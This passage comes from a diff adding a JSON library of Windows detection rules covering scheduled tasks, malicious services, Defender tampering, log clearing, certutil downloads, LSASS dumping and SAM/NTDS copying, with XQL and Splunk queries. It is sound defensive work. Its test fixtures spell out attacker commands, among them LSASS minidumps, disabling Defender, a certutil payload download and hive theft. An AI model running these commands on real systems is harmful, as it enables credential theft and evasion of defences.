+     {
+      "process.name": "powershell.exe",
+      "registry.key": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "registry.value": "Updater",
+      "registry.data": "C:\\Users\\amine\\AppData\\Roaming\\svc\\updater.exe"
+     },
+     {
+      "process.name": "reg.exe",
+      "registry.key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+      "registry.value": "x",
+      "registry.data": "mshta vbscript:Execute(\"...\")"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "setup.exe",
+      "registry.key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "registry.value": "Vendor",
+      "registry.data": "\"C:\\Program Files\\Vendor\\agent.exe\" --tray"
+     },
+     {
+      "process.name": "explorer.exe",
+      "registry.key": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
+      "registry.value": "0",
+      "registry.data": "C:\\Users\\amine\\AppData\\x.docx"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0010",
+   "title": "Scheduled task created to run a script host or a file in a user-writable path",
+   "description": "schtasks /create with an action that launches PowerShell, a script host, a LOLBin, a URL or a file in AppData, Temp or Public. Scheduled tasks are used for persistence and for running code as SYSTEM.",
+   "attack": [
+    "T1053.005"
+   ],
+   "tactic": "persistence",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "schtasks.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "/create"
+      ]
+     }
+    ],
+    "suspicious_action": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "\\appdata\\",
+       "\\temp\\",
+       "\\users\\public\\",
+       "powershell",
+       "mshta",
+       "wscript",
+       "cscript",
+       "rundll32",
+       "regsvr32",
+       "cmd /c",
+       "cmd.exe /c",
+       "http://",
+       "https://"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "selection"
+     },
+     {
+      "sel": "suspicious_action"
+     }
+    ]
+   },
+   "condition_text": "selection and suspicious_action",
+   "triage": [
+    "Export the task (schtasks /query /tn <name> /xml) and read the action and trigger.",
+    "Check the account the task runs as and who created it."
+   ],
+   "false_positives": [
+    "Software updaters that register their own task from AppData (browsers, chat apps)."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name = \"schtasks.exe\" and action_process_image_command_line contains \"/create\") and (action_process_image_command_line contains \"\\\\appdata\\\\\" or action_process_image_command_line contains \"\\\\temp\\\\\" or action_process_image_command_line contains \"\\\\users\\\\public\\\\\" or action_process_image_command_line contains \"powershell\" or action_process_image_command_line contains \"mshta\" or action_process_image_command_line contains \"wscript\" or action_process_image_command_line contains \"cscript\" or action_process_image_command_line contains \"rundll32\" or action_process_image_command_line contains \"regsvr32\" or action_process_image_command_line contains \"cmd /c\" or action_process_image_command_line contains \"cmd.exe /c\" or action_process_image_command_line contains \"http://\" or action_process_image_command_line contains \"https://\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (lower(process_name)=\"schtasks.exe\" AND match(CommandLine, \"(?i)/create\")) AND (match(CommandLine, \"(?i)\\\\\\\\appdata\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\temp\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\users\\\\\\\\public\\\\\\\\\") OR match(CommandLine, \"(?i)powershell\") OR match(CommandLine, \"(?i)mshta\") OR match(CommandLine, \"(?i)wscript\") OR match(CommandLine, \"(?i)cscript\") OR match(CommandLine, \"(?i)rundll32\") OR match(CommandLine, \"(?i)regsvr32\") OR match(CommandLine, \"(?i)cmd\\\\ /c\") OR match(CommandLine, \"(?i)cmd\\\\.exe\\\\ /c\") OR match(CommandLine, \"(?i)http://\") OR match(CommandLine, \"(?i)https://\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "schtasks.exe",
+      "process.command_line": "schtasks /create /sc minute /mo 15 /tn \"OneDrive Sync\" /tr \"powershell -w hidden -f C:\\Users\\Public\\s.ps1\" /ru SYSTEM"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "schtasks.exe",
+      "process.command_line": "schtasks /query /fo LIST"
+     },
+     {
+      "process.name": "schtasks.exe",
+      "process.command_line": "schtasks /create /tn Backup /tr \"C:\\Program Files\\Backup\\run.exe\" /sc daily"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0011",
+   "title": "Service created with a suspicious binary path",
+   "description": "sc create registers a service whose binPath runs cmd, PowerShell, a LOLBin or a file from a user-writable folder. Services run as SYSTEM, so this is both persistence and privilege escalation. Remote service creation is also how PsExec-like tools move laterally.",
+   "attack": [
+    "T1543.003",
+    "T1569.002"
+   ],
+   "tactic": "persistence",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "sc.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       " create "
+      ]
+     }
+    ],
+    "suspicious_path": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "\\appdata\\",
+       "\\temp\\",
+       "\\users\\public\\",
+       "\\programdata\\",
+       "powershell",
+       "cmd /c",
+       "cmd.exe /c",
+       "%comspec%",
+       "mshta",
+       "rundll32",
+       "regsvr32"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "selection"
+     },
+     {
+      "sel": "suspicious_path"
+     }
+    ]
+   },
+   "condition_text": "selection and suspicious_path",
+   "triage": [
+    "Query the service (sc qc <name>) and inspect the binary.",
+    "If the command targeted another host (sc \\\\host create), investigate that host too."
+   ],
+   "false_positives": [
+    "Installers that create a service from ProgramData. Allowlist by signer."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name = \"sc.exe\" and action_process_image_command_line contains \" create \") and (action_process_image_command_line contains \"\\\\appdata\\\\\" or action_process_image_command_line contains \"\\\\temp\\\\\" or action_process_image_command_line contains \"\\\\users\\\\public\\\\\" or action_process_image_command_line contains \"\\\\programdata\\\\\" or action_process_image_command_line contains \"powershell\" or action_process_image_command_line contains \"cmd /c\" or action_process_image_command_line contains \"cmd.exe /c\" or action_process_image_command_line contains \"%comspec%\" or action_process_image_command_line contains \"mshta\" or action_process_image_command_line contains \"rundll32\" or action_process_image_command_line contains \"regsvr32\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (lower(process_name)=\"sc.exe\" AND match(CommandLine, \"(?i)\\\\ create\\\\ \")) AND (match(CommandLine, \"(?i)\\\\\\\\appdata\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\temp\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\users\\\\\\\\public\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\programdata\\\\\\\\\") OR match(CommandLine, \"(?i)powershell\") OR match(CommandLine, \"(?i)cmd\\\\ /c\") OR match(CommandLine, \"(?i)cmd\\\\.exe\\\\ /c\") OR match(CommandLine, \"(?i)%comspec%\") OR match(CommandLine, \"(?i)mshta\") OR match(CommandLine, \"(?i)rundll32\") OR match(CommandLine, \"(?i)regsvr32\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "sc.exe",
+      "process.command_line": "sc \\\\10.0.0.5 create upd binPath= \"cmd.exe /c powershell -enc AAAA\" start= auto"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "sc.exe",
+      "process.command_line": "sc create VendorSvc binPath= \"C:\\Program Files\\Vendor\\svc.exe\" start= auto"
+     },
+     {
+      "process.name": "sc.exe",
+      "process.command_line": "sc query state= all"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0012",
+   "title": "Microsoft Defender disabled or given exclusions",
+   "description": "Set-MpPreference or Add-MpPreference turns off real-time, behaviour or script scanning, or adds a path, process or extension exclusion. Or the WinDefend service is stopped. Ransomware operators do this right before deploying the payload.",
+   "attack": [
+    "T1562.001"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "powershell": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "powershell.exe",
+       "pwsh.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "set-mppreference",
+       "add-mppreference"
+      ]
+     }
+    ],
+    "weakening": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "disablerealtimemonitoring",
+       "disablebehaviormonitoring",
+       "disableioavprotection",
+       "disablescriptscanning",
+       "disableblockatfirstseen",
+       "exclusionpath",
+       "exclusionprocess",
+       "exclusionextension"
+      ]
+     }
+    ],
+    "service_stop": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "sc.exe",
+       "net.exe",
+       "net1.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "windefend"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "and": [
+       {
+        "sel": "powershell"
+       },
+       {
+        "sel": "weakening"
+       }
+      ]
+     },
+     {
+      "sel": "service_stop"
+     }
+    ]
+   },
+   "condition_text": "(powershell and weakening) or service_stop",
+   "triage": [
+    "Read the exact setting changed and revert it.",
+    "Treat the host as compromised until proven otherwise; look at the 30 minutes before for the access path.",
+    "Check whether the same command ran on other hosts (it often runs fleet-wide before encryption)."
+   ],
+   "false_positives": [
+    "Exclusions pushed by IT for backup or database software. These should come from GPO or Intune, not an interactive shell."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter ((action_process_image_name in (\"powershell.exe\", \"pwsh.exe\") and (action_process_image_command_line contains \"set-mppreference\" or action_process_image_command_line contains \"add-mppreference\")) and (action_process_image_command_line contains \"disablerealtimemonitoring\" or action_process_image_command_line contains \"disablebehaviormonitoring\" or action_process_image_command_line contains \"disableioavprotection\" or action_process_image_command_line contains \"disablescriptscanning\" or action_process_image_command_line contains \"disableblockatfirstseen\" or action_process_image_command_line contains \"exclusionpath\" or action_process_image_command_line contains \"exclusionprocess\" or action_process_image_command_line contains \"exclusionextension\")) or (action_process_image_name in (\"sc.exe\", \"net.exe\", \"net1.exe\") and action_process_image_command_line contains \"windefend\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (((lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\") AND (match(CommandLine, \"(?i)set\\\\-mppreference\") OR match(CommandLine, \"(?i)add\\\\-mppreference\"))) AND (match(CommandLine, \"(?i)disablerealtimemonitoring\") OR match(CommandLine, \"(?i)disablebehaviormonitoring\") OR match(CommandLine, \"(?i)disableioavprotection\") OR match(CommandLine, \"(?i)disablescriptscanning\") OR match(CommandLine, \"(?i)disableblockatfirstseen\") OR match(CommandLine, \"(?i)exclusionpath\") OR match(CommandLine, \"(?i)exclusionprocess\") OR match(CommandLine, \"(?i)exclusionextension\"))) OR ((lower(process_name)=\"sc.exe\" OR lower(process_name)=\"net.exe\" OR lower(process_name)=\"net1.exe\") AND match(CommandLine, \"(?i)windefend\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell -c Add-MpPreference -ExclusionPath C:\\ProgramData"
+     },
+     {
+      "process.name": "sc.exe",
+      "process.command_line": "sc stop WinDefend"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Get-MpPreference"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Update-MpSignature"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0013",
+   "title": "Windows event logs cleared from the command line",
+   "description": "wevtutil cl, Clear-EventLog, Remove-EventLog or the .NET ClearLog call wipe event logs to destroy evidence. Admins very rarely clear logs by hand.",
+   "attack": [
+    "T1070.001"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "wevtutil": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "wevtutil.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\s(cl|clear-log)\\s"
+      ]
+     }
+    ],
+    "powershell": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "powershell.exe",
+       "pwsh.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "clear-eventlog",
+       "remove-eventlog",
+       "clearlog"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "wevtutil"
+     },
+     {
+      "sel": "powershell"
+     }
+    ]
+   },
+   "condition_text": "wevtutil or powershell",
+   "triage": [
+    "Look for event 1102 (Security log cleared) and 104 (System log cleared) from the same time.",
+    "Pull logs from the SIEM or EDR for the period before the wipe, they are still there."
+   ],
+   "false_positives": [
+    "Lab or golden-image build scripts that reset logs before sealing an image."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name = \"wevtutil.exe\" and action_process_image_command_line ~= \"(?i)\\\\s(cl|clear-log)\\\\s\") or (action_process_image_name in (\"powershell.exe\", \"pwsh.exe\") and (action_process_image_command_line contains \"clear-eventlog\" or action_process_image_command_line contains \"remove-eventlog\" or action_process_image_command_line contains \"clearlog\"))\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (lower(process_name)=\"wevtutil.exe\" AND match(CommandLine, \"(?i)\\\\s(cl|clear-log)\\\\s\")) OR ((lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\") AND (match(CommandLine, \"(?i)clear\\\\-eventlog\") OR match(CommandLine, \"(?i)remove\\\\-eventlog\") OR match(CommandLine, \"(?i)clearlog\")))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "wevtutil.exe",
+      "process.command_line": "wevtutil cl Security"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Clear-EventLog -LogName Application,System"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "wevtutil.exe",
+      "process.command_line": "wevtutil qe Security /c:5 /f:text"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0014",
+   "title": "Windows system process name running from the wrong folder",
+   "description": "A process named like a core Windows binary (svchost, lsass, csrss, services, winlogon, smss, wininit, spoolsv, taskhostw) runs from outside System32 or SysWOW64. Malware uses these names to blend into a process list.",
+   "attack": [
+    "T1036.005"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "system_name": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "svchost.exe",
+       "lsass.exe",
+       "csrss.exe",
+       "services.exe",
+       "winlogon.exe",
+       "smss.exe",
+       "wininit.exe",
+       "spoolsv.exe",
+       "taskhostw.exe",
+       "lsm.exe"
+      ]
+     }
+    ],
+    "real_location": [
+     {
+      "field": "process.path",
+      "op": "re",
+      "all": false,
+      "values": [
+       "^(\\\\\\\\\\?\\\\)?[a-z]:\\\\windows\\\\(system32|syswow64)\\\\[^\\\\]+$"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "system_name"
+     },
+     {
+      "not": {
+       "sel": "real_location"
+      }
+     }
+    ]
+   },
+   "condition_text": "system_name and not real_location",
+   "triage": [
+    "Hash the binary and check signature and prevalence.",
+    "Check its parent, its network connections and how it persists."
+   ],
+   "false_positives": [
+    "None expected on a healthy system. Windows itself never runs these from elsewhere."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in (\"svchost.exe\", \"lsass.exe\", \"csrss.exe\", \"services.exe\", \"winlogon.exe\", \"smss.exe\", \"wininit.exe\", \"spoolsv.exe\", \"taskhostw.exe\", \"lsm.exe\") and not ((action_process_image_path != null and action_process_image_path ~= \"(?i)^(\\\\\\\\\\\\\\\\\\\\?\\\\\\\\)?[a-z]:\\\\\\\\windows\\\\\\\\(system32|syswow64)\\\\\\\\[^\\\\\\\\]+$\"))\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (lower(process_name)=\"svchost.exe\" OR lower(process_name)=\"lsass.exe\" OR lower(process_name)=\"csrss.exe\" OR lower(process_name)=\"services.exe\" OR lower(process_name)=\"winlogon.exe\" OR lower(process_name)=\"smss.exe\" OR lower(process_name)=\"wininit.exe\" OR lower(process_name)=\"spoolsv.exe\" OR lower(process_name)=\"taskhostw.exe\" OR lower(process_name)=\"lsm.exe\") AND NOT ((isnotnull(Image) AND match(Image, \"(?i)^(\\\\\\\\\\\\\\\\\\\\?\\\\\\\\)?[a-z]:\\\\\\\\windows\\\\\\\\(system32|syswow64)\\\\\\\\[^\\\\\\\\]+$\")))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "svchost.exe",
+      "process.path": "C:\\Users\\Public\\svchost.exe"
+     },
+     {
+      "process.name": "lsass.exe",
+      "process.path": "C:\\Windows\\Temp\\lsass.exe"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "svchost.exe",
+      "process.path": "C:\\Windows\\System32\\svchost.exe"
+     },
+     {
+      "process.name": "svchost.exe",
+      "process.path": "\\\\?\\C:\\Windows\\system32\\svchost.exe"
+     },
+     {
+      "process.name": "notepad.exe",
+      "process.path": "C:\\Users\\Public\\notepad.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0015",
+   "title": "certutil used to download or decode a file",
+   "description": "certutil -urlcache, -verifyctl or -decode used as a downloader or Base64 decoder. A signed Microsoft tool doing a job it was not made for.",
+   "attack": [
+    "T1105",
+    "T1140"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "certutil.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "urlcache",
+       "verifyctl",
+       "-decode",
+       "/decode",
+       "-decodehex",
+       "/decodehex"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Retrieve the downloaded or decoded file from the path in the command line.",
+    "Check what ran it next."
+   ],
+   "false_positives": [
+    "PKI admins clearing the URL cache (certutil -urlcache * delete). Check for a URL in the command line."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"certutil.exe\" and (action_process_image_command_line contains \"urlcache\" or action_process_image_command_line contains \"verifyctl\" or action_process_image_command_line contains \"-decode\" or action_process_image_command_line contains \"/decode\" or action_process_image_command_line contains \"-decodehex\" or action_process_image_command_line contains \"/decodehex\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"certutil.exe\" AND (match(CommandLine, \"(?i)urlcache\") OR match(CommandLine, \"(?i)verifyctl\") OR match(CommandLine, \"(?i)\\\\-decode\") OR match(CommandLine, \"(?i)/decode\") OR match(CommandLine, \"(?i)\\\\-decodehex\") OR match(CommandLine, \"(?i)/decodehex\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "certutil.exe",
+      "process.command_line": "certutil -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe"
+     },
+     {
+      "process.name": "certutil.exe",
+      "process.command_line": "certutil -decode C:\\temp\\a.b64 C:\\temp\\a.dll"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "certutil.exe",
+      "process.command_line": "certutil -store my"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0016",
+   "title": "LSASS memory dumped with comsvcs.dll or ProcDump",
+   "description": "rundll32 calling the MiniDump export of comsvcs.dll (by name or by ordinal #24), or ProcDump pointed at lsass. Both write the LSASS process memory to disk so passwords, hashes and Kerberos tickets can be extracted offline.",
+   "attack": [
+    "T1003.001"
+   ],
+   "tactic": "credential-access",
+   "severity": "critical",
+   "logsource": "process_creation",
+   "selections": {
+    "comsvcs": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "rundll32.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "comsvcs"
+      ]
+     }
+    ],
+    "minidump": [
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(minidump|#\\+?0*24\\b)"
+      ]
+     }
+    ],
+    "procdump": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "procdump.exe",
+       "procdump64.exe",
+       "procdump64a.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "lsass"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "and": [
+       {
+        "sel": "comsvcs"
+       },
+       {
+        "sel": "minidump"
+       }
+      ]
+     },
+     {
+      "sel": "procdump"
+     }
+    ]
+   },
+   "condition_text": "(comsvcs and minidump) or procdump",
+   "triage": [
+    "Find and secure the dump file named in the command line, then delete it.",
+    "Assume every credential cached on the host is stolen. Reset them, starting with privileged accounts.",
+    "Hunt for logons from the accounts that were on this host to new places in the following hours."
+   ],
+   "false_positives": [
+    "Support engineers capturing an LSASS dump for Microsoft during a case. Should be rare and announced."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter ((action_process_image_name = \"rundll32.exe\" and action_process_image_command_line contains \"comsvcs\") and action_process_image_command_line ~= \"(?i)(minidump|#\\\\+?0*24\\\\b)\") or (action_process_image_name in (\"procdump.exe\", \"procdump64.exe\", \"procdump64a.exe\") and action_process_image_command_line contains \"lsass\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((lower(process_name)=\"rundll32.exe\" AND match(CommandLine, \"(?i)comsvcs\")) AND match(CommandLine, \"(?i)(minidump|#\\\\+?0*24\\\\b)\")) OR ((lower(process_name)=\"procdump.exe\" OR lower(process_name)=\"procdump64.exe\" OR lower(process_name)=\"procdump64a.exe\") AND match(CommandLine, \"(?i)lsass\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "rundll32.exe",
+      "process.command_line": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"
+     },
+     {
+      "process.name": "rundll32.exe",
+      "process.command_line": "rundll32 comsvcs.dll #24 624 C:\\Users\\Public\\x.bin full"
+     },
+     {
+      "process.name": "procdump64.exe",
+      "process.command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\temp\\ls.dmp"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "rundll32.exe",
+      "process.command_line": "rundll32.exe comsvcs.dll,DllRegisterServer"
+     },
+     {
+      "process.name": "procdump.exe",
+      "process.command_line": "procdump -ma w3wp.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0017",
+   "title": "SAM, SYSTEM, SECURITY hives or NTDS.dit copied for offline cracking",
+   "description": "reg save of the SAM, SYSTEM or SECURITY hive, or ntdsutil creating an IFM copy of the Active Directory database. With these files an attacker gets local hashes, LSA secrets, or every domain hash.",
+   "attack": [
+    "T1003.002",
+    "T1003.003",
+    "T1003.004"
+   ],
+   "tactic": "credential-access",
+   "severity": "critical",
+   "logsource": "process_creation",
+   "selections": {
+    "reg_save": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "reg.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\s(save|export)\\s+\"?(hklm|hkey_local_machine)\\\\(sam|system|security)\"?(\\s|$)"
+      ]
+     }
+    ],
+    "ntds_ifm": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "ntdsutil.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "ifm",
+       "ac i ntds",
+       "activate instance ntds"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "reg_save"
+     },
+     {
+      "sel": "ntds_ifm"
+     }
+    ]
+   },
+   "condition_text": "reg_save or ntds_ifm",
+   "triage": [
+    "Find the output files and where they went next (copy to a share, archive, upload).",
+    "On a domain controller, treat it as full domain compromise until ruled out."
+   ],
+   "false_positives": [
+    "Domain controller promotion from media (IFM) planned by the AD team."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name = \"reg.exe\" and action_process_image_command_line ~= \"(?i)\\\\s(save|export)\\\\s+\\\"?(hklm|hkey_local_machine)\\\\\\\\(sam|system|security)\\\"?(\\\\s|$)\") or (action_process_image_name = \"ntdsutil.exe\" and (action_process_image_command_line contains \"ifm\" or action_process_image_command_line contains \"ac i ntds\" or action_process_image_command_line contains \"activate instance ntds\"))\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (lower(process_name)=\"reg.exe\" AND match(CommandLine, \"(?i)\\\\s(save|export)\\\\s+\\\"?(hklm|hkey_local_machine)\\\\\\\\(sam|system|security)\\\"?(\\\\s|$)\")) OR (lower(process_name)=\"ntdsutil.exe\" AND (match(CommandLine, \"(?i)ifm\") OR match(CommandLine, \"(?i)ac\\\\ i\\\\ ntds\") OR match(CommandLine, \"(?i)activate\\\\ instance\\\\ ntds\")))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "reg.exe",
+      "process.command_line": "reg save HKLM\\SAM C:\\Users\\Public\\sam.save"
+     },
+     {
+      "process.name": "reg.exe",
+      "process.command_line": "reg.exe save hklm\\system C:\\temp\\sys"
+     },
+     {
+      "process.name": "ntdsutil.exe",
+      "process.command_line": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ifm\" q q"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "reg.exe",
+      "process.command_line": "reg export HKLM\\SOFTWARE\\Vendor C:\\temp\\vendor.reg"
+     },
+     {
+      "process.name": "reg.exe",
